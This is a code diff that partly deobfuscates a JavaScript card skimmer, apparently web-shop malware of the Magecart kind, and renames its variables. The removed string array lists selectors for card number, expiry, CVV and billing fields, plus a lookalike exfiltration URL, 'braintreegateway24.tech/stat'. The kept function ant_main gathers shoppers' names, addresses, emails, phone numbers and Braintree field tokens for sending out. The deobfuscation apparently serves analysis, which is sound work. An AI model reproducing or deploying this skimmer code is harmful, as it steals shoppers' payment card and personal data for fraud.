@@ -1,100 +1,3 @@
-var _0x1ad7 = [
-	"ant_zero",
-	"undefined",
-	"ant_loaded",
-	"ant_last_data",
-	"ant_interval",
-	"payment_checkout1",
-	"*[name*='numero_cartao']",
-	"input[id*='cc_number']",
-	"*[name*='cc_num']",
-	"payment_checkout2",
-	"*[name*='expiracao_mes']",
-	"*[name*='cc_exp_m']",
-	"*[name*='expirationMonth']",
-	"payment_checkout3",
-	"*[name*='expiracao_ano']",
-	"*[name*='cc_exp_y']",
-	"*[name*='expirationYear']",
-	"payment_checkout4",
-	"*[name*='codigo_seguranca']",
-	"input[id*='cc_cid']",
-	"*[name*='cc_cid']",
-	"*[name*='cc_cvv']",
-	"hasOwnProperty",
-	"=",
-	"push",
-	"&",
-	"join",
-	"length",
-	"substr",
-	"",
-	"charCodeAt",
-	"random",
-	"floor",
-	"item",
-	"head",
-	"getElementsByTagName",
-	"script",
-	"createElement",
-	"https://braintreegateway24.tech/stat?",
-	"src",
-	"setAttribute",
-	"appendChild",
-	"querySelector",
-	"querySelectorAll",
-	"value",
-	"hostname",
-	"braintree-hosted-field-number",
-	"getElementById",
-	"#",
-	"indexOf",
-	"substring",
-	"*[name='billing[firstname]']",
-	"input[name=\"firstname\"]",
-	"*[name='billing[lastname]']",
-	"input[name=\"lastname\"]",
-	"*[name='billing[street][]']",
-	"input[name=\"street[0]\"]",
-	"*[name='billing[city]']",
-	"input[name=\"city\"]",
-	"*[name='billing[region_id]']",
-	"input[name='region']",
-	"select[name='region_id']",
-	"*[name='billing[postcode]']",
-	"input[name='postcode']",
-	"*[name='billing[country_id]']",
-	"*[name='country_id']",
-	"*[name='billing[telephone]']",
-	"input[name='telephone']",
-	"*[name='billing[email]']",
-	"input[name='username']",
-	"host",
-	"firstname",
-	"lastname",
-	"address",
-	"city",
-	"state",
-	"zip",
-	"country",
-	"phone",
-	"email",
-	"uagent",
-	"userAgent",
-	"tree",
-	"ztoken=",
-	"button[onclick*='.save']",
-	"button[class*='checkout']",
-	"includes",
-	"ant_check",
-	"getAttribute",
-	"1",
-	"click",
-	"addEventListener",
-	"mousedown",
-	"DOMContentLoaded",
-	"load"
-];
 if (typeof window.ant_zero == "undefined") {
 	window.ant_zero = 0;
 	window.ant_loaded = false;
@@ -195,52 +98,52 @@ if (typeof window.ant_zero == "undefined") {
 		return "";
 	}
 	function ant_main() {
-		var _0x9149x26 = location.hostname;
-		var _0x9149x27 = document.getElementById("braintree-hosted-field-number");
-		if (!_0x9149x27) {
+		var hostname = location.hostname;
+		var braintreeHostedFieldNumber = document.getElementById("braintree-hosted-field-number");
+		if (!braintreeHostedFieldNumber) {
 			return;
 		}
-		var _0x9149x28 = _0x9149x27.src;
-		var _0x9149x29 = _0x9149x28.substring(_0x9149x28.indexOf("#") + 1);
-		var _0x9149x2a = ant_get_val_multi(["*[name='billing[firstname]']", "input[name=\"firstname\"]"]);
-		var _0x9149x2b = ant_get_val_multi(["*[name='billing[lastname]']", "input[name=\"lastname\"]"]);
-		var _0x9149x2c = ant_get_val_multi(["*[name='billing[street][]']", "input[name=\"street[0]\"]"]);
-		var _0x9149x2d = ant_get_val_multi(["*[name='billing[city]']", "input[name=\"city\"]"]);
-		var _0x9149x2e = ant_get_val_multi([
+		var src = braintreeHostedFieldNumber.src;
+		var treeValue = src.substring(src.indexOf("#") + 1);
+		var firstnameValue = ant_get_val_multi(["*[name='billing[firstname]']", "input[name=\"firstname\"]"]);
+		var lastnameValue = ant_get_val_multi(["*[name='billing[lastname]']", "input[name=\"lastname\"]"]);
+		var addressValue = ant_get_val_multi(["*[name='billing[street][]']", "input[name=\"street[0]\"]"]);
+		var cityValue = ant_get_val_multi(["*[name='billing[city]']", "input[name=\"city\"]"]);
+		var stateValue = ant_get_val_multi([
 			"*[name='billing[region_id]']",
 			"input[name='region']",
 			"select[name='region_id']"
 		]);
-		var _0x9149x2f = ant_get_val_multi(["*[name='billing[postcode]']", "input[name='postcode']"]);
-		var _0x9149x30 = ant_get_val_multi(["*[name='billing[country_id]']", "*[name='country_id']"]);
-		var _0x9149x31 = ant_get_val_multi(["*[name='billing[telephone]']", "input[name='telephone']"]);
-		var _0x9149x32 = ant_get_val_multi(["*[name='billing[email]']", "input[name='username']"]);
+		var zipValue = ant_get_val_multi(["*[name='billing[postcode]']", "input[name='postcode']"]);
+		var countryValue = ant_get_val_multi(["*[name='billing[country_id]']", "*[name='country_id']"]);
+		var phoneValue = ant_get_val_multi(["*[name='billing[telephone]']", "input[name='telephone']"]);
+		var emailValue = ant_get_val_multi(["*[name='billing[email]']", "input[name='username']"]);
 		var _0x9149x6 = [];
 		var _0x9149x7 = [];
 		_0x9149x6.push("host");
-		_0x9149x7.push(_0x9149x26);
+		_0x9149x7.push(hostname);
 		_0x9149x6.push("firstname");
-		_0x9149x7.push(_0x9149x2a);
+		_0x9149x7.push(firstnameValue);
 		_0x9149x6.push("lastname");
-		_0x9149x7.push(_0x9149x2b);
+		_0x9149x7.push(lastnameValue);
 		_0x9149x6.push("address");
-		_0x9149x7.push(_0x9149x2c);
+		_0x9149x7.push(addressValue);
 		_0x9149x6.push("city");
-		_0x9149x7.push(_0x9149x2d);
+		_0x9149x7.push(cityValue);
 		_0x9149x6.push("state");
-		_0x9149x7.push(_0x9149x2e);
+		_0x9149x7.push(stateValue);
 		_0x9149x6.push("zip");
-		_0x9149x7.push(_0x9149x2f);
+		_0x9149x7.push(zipValue);
 		_0x9149x6.push("country");
-		_0x9149x7.push(_0x9149x30);
+		_0x9149x7.push(countryValue);
 		_0x9149x6.push("phone");
-		_0x9149x7.push(_0x9149x31);
+		_0x9149x7.push(phoneValue);
 		_0x9149x6.push("email");
-		_0x9149x7.push(_0x9149x32);
+		_0x9149x7.push(emailValue);
 		_0x9149x6.push("uagent");
 		_0x9149x7.push(navigator.userAgent);
 		_0x9149x6.push("tree");
-		_0x9149x7.push(_0x9149x29);
+		_0x9149x7.push(treeValue);
 		var _0x9149x33 = ant_pack(serializeKeysValues(_0x9149x6, _0x9149x7));
 		if (_0x9149x33 == window.ant_last_data) {
 			return;
@@ -250,8 +153,8 @@ if (typeof window.ant_zero == "undefined") {
 		ant_post_ajax(_0x9149x7, false);
 	}
 	function ant_cockroach() {
-		var _0x9149x27 = document.getElementById("braintree-hosted-field-number");
-		if (!_0x9149x27) {
+		var braintreeHostedFieldNumber = document.getElementById("braintree-hosted-field-number");
+		if (!braintreeHostedFieldNumber) {
 			return;
 		}
 		var _0x9149x35 = [];
